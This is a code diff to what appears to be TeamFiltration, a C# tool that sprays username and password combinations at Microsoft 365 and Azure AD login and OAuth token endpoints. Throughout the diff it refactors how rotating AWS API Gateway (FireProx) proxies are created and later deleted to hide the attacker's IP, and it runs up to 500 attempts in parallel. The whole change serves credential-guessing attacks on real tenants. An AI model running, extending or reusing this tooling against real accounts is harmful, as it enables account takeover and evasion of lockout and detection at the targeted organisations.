@@ -23,8 +23,9 @@ namespace TeamFiltration.Modules
     {
         private static async Task<bool> CheckForAdfs(string email, GlobalArgumentsHandler _globalProperties)
         {
-
-            var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
+            //This does not need to be FireProx
+            //var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
+            var url = $"https://login.microsoftonline.com/getuserrealm.srf?login={email}&xml=1";
 
             var proxy = new WebProxy
             {
@@ -70,8 +71,14 @@ namespace TeamFiltration.Modules
         {
             var userRealObject = new UserRealmResp() { };
 
-            var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
-            var UsGovUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.us", 0) + $"getuserrealm.srf?login={email}&xml=1";
+            //This does not need fireprox?
+
+            //var url = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + $"getuserrealm.srf?login={email}&xml=1";
+
+            // var UsGovUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.us", 0) + $"getuserrealm.srf?login={email}&xml=1";
+
+            var url = $"https://login.microsoftonline.com/getuserrealm.srf?login={email}&xml=1";
+            var UsGovUrl = $"https://login.microsoftonline.us/getuserrealm.srf?login={email}&xml=1";
 
             var proxy = new WebProxy
             {
@@ -304,7 +311,7 @@ namespace TeamFiltration.Modules
             var databaseHandle = new DatabaseHandler(args);
 
             var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);
-          
+
 
             //Calcuate time format for spraying to happen
             if (args.Contains("--time-window"))
@@ -412,25 +419,28 @@ namespace TeamFiltration.Modules
 
                     var regionCounter = 0;
 
+
+                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject =
+                        _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
+
+                    if (aadSSO)
+                        fireProxObject = _globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
+
+                    if (_globalProperties.UsCloud)
+                        fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
+
                     foreach (var userCombo in File.ReadAllLines(comboListPath)?.Where(x => !string.IsNullOrEmpty(x)))
                     {
                         var randomResource = Helpers.Generic.RandomO365Res();
 
-                        var fireProxUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", regionCounter) + "/common/oauth2/token/";
-
-                        if (aadSSO)
-                            fireProxUrl = _globalProperties.GetFireProxURL("https://autologon.microsoftazuread-sso.com", regionCounter) + "/common/oauth2/token/";
-
-                        if (_globalProperties.UsCloud)
-                            fireProxUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.us", regionCounter) + "/common/oauth2/token/";
 
                         var sprayBuff = new SprayAttempt()
                         {
 
                             Username = userCombo.Split(":")[0],
                             Password = userCombo.Split(":")[1],
-                            FireProxURL = fireProxUrl,
-                            FireProxRegion = fireProxUrl.Split('.')[2].Split('.')[0],
+                            FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
+                            FireProxRegion = fireProxObject.Item2.Region,
                             ResourceClientId = randomResource.clientId,
                             ResourceUri = randomResource.Uri,
                             AADSSO = aadSSO,
@@ -447,9 +457,14 @@ namespace TeamFiltration.Modules
                         else
                             nonSprayed.Add(userCombo);
 
+                   
                     }
 
                     File.WriteAllLines(comboListPath.Replace(".txt", "_extra.txt"), nonSprayed);
+
+                    if (_globalProperties.DeleteFireProx)
+                        await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+
                 }
                 else
                 {
@@ -485,6 +500,14 @@ namespace TeamFiltration.Modules
                     }
 
 
+                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject =
+                      _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
+
+                    if (aadSSO)
+                        fireProxObject = _globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
+
+                    if (_globalProperties.UsCloud)
+                        fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
 
                     //Generate those combinations super fast!
                     await bufferuserNameList.ParallelForEachAsync(
@@ -498,13 +521,7 @@ namespace TeamFiltration.Modules
                         //If this combo does NOT exsits, add it
                         if (!databaseHandle.QueryComboHash(bufferHash))
                         {
-                            var fireProxUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", regionCounter) + "/common/oauth2/token/";
 
-                            if (aadSSO)
-                                fireProxUrl = _globalProperties.GetFireProxURL("https://autologon.microsoftazuread-sso.com", regionCounter) + "/common/oauth2/token/";
-
-                            if (_globalProperties.UsCloud)
-                                fireProxUrl = _globalProperties.GetFireProxURL("https://login.microsoftonline.us", regionCounter) + "/common/oauth2/token/";
 
                             listOfSprayAttempts.Add(new SprayAttempt()
                             {
@@ -512,8 +529,8 @@ namespace TeamFiltration.Modules
                                 Username = userName,
                                 Password = password,
                                 ComboHash = bufferHash,
-                                FireProxURL = fireProxUrl,
-                                FireProxRegion = fireProxUrl.Split('.')[2].Split('.')[0],
+                                FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
+                                FireProxRegion = fireProxObject.Item2.Region,
                                 ResourceClientId = randomResource.clientId,
                                 ResourceUri = randomResource.Uri,
                                 AADSSO = aadSSO,
@@ -522,6 +539,11 @@ namespace TeamFiltration.Modules
                         }
                     },
                       maxDegreeOfParallelism: 500);
+
+
+                    if (_globalProperties.DeleteFireProx)
+                        await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+
 
                     if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
                         regionCounter = 0;
